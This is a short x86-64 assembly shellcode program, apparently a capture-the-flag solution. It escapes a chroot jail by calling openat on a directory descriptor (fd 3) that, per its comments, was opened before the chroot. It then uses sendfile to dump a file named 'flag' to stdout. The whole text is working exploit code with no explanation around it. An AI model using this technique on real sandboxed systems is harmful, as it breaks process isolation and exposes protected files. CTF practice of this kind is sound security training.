.global _start
.intel_syntax noprefix

_start:
    # Openat syscall
    mov rdi, 3                   # dirfd (3 because it was opened before chroot)
    lea rsi, [rip + flag]        # pathname (relative to dirfd)
    xor rdx, rdx                 # flags
    xor r10, r10                 # mode
    mov rax, 0x101               # syscall number for openat
    syscall

    # Sendfile syscall
    mov rdi, 1                   # out_fd (stdout)
    mov rsi, rax                 # in_fd (file descriptor returned by openat)
    xor rdx, rdx                 # offset
    mov r10, 1000                # count (number of bytes to send)
    mov rax, 0x28                # syscall number for sendfile
    syscall

    # Exit syscall
    xor rdi, rdi                 # exit code
    mov rax, 0x3c                # syscall number for exit
    syscall

flag:
    .string "flag"
